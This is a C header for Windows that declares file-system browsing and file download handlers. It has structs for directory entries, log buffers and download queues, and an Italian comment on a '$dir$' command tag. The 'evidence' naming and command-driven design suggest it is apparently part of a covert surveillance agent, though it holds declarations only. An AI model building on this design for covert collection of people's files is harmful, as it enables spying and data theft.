#ifndef _FILESYSTEM_H
#define _FILESYSTEM_H
#include <Windows.h>

BOOL FileSystemHandler(DWORD dwMsgLen, DWORD dwNumDir, LPBYTE lpDirBuffer);
BOOL DownloadHandler(DWORD dwMsgLen, DWORD dwNumFile, LPBYTE lpFileBuffer);
LPBYTE DownloadGetEvidence(LPWSTR strFileName, LPWSTR strDisplayName, LPBYTE *lpHeader, LPDWORD dwHeaderSize, LPDWORD dwfileSize);

typedef struct {
#define DIR_EXP_VERSION 2010031501
	DWORD version;
	DWORD path_len;
#define PATH_IS_DIRECTORY 1
#define PATH_IS_EMPTY     2
	DWORD flags;
	DWORD file_size_lo;
	DWORD file_size_hi;
	FILETIME last_write;
} directory_header_struct;

typedef struct _FileAdditionalData {
	UINT uVersion;
		#define LOG_FILE_VERSION 2008122901
	UINT uFileNameLen;
} FileAdditionalData, *pFileAdditionalData;

typedef struct 
{
	DWORD dwSize;
	LPBYTE lpBuffer;
} FILESYSTEM_LOGS, *LPFILESYSTEM;

typedef struct
{
	LPWSTR strFileName;
	LPWSTR strDisplayName;
} DOWNLOAD_LOGS, *LPDOWNLOAD_LOGS;

// Nome della tag che nei comandi e nei download indica la home
#define HOME_VAR_NAME "$dir$" 
#define HOME_VAR_NAME_W L"$dir$" 

#define MAX_FILESYSTEM_QUEUE 4096 

extern FILESYSTEM_LOGS lpFileSystemLogs[MAX_FILESYSTEM_QUEUE];
extern DOWNLOAD_LOGS lpDownloadLogs[MAX_FILESYSTEM_QUEUE];

#endif // _FILESYSTEM_H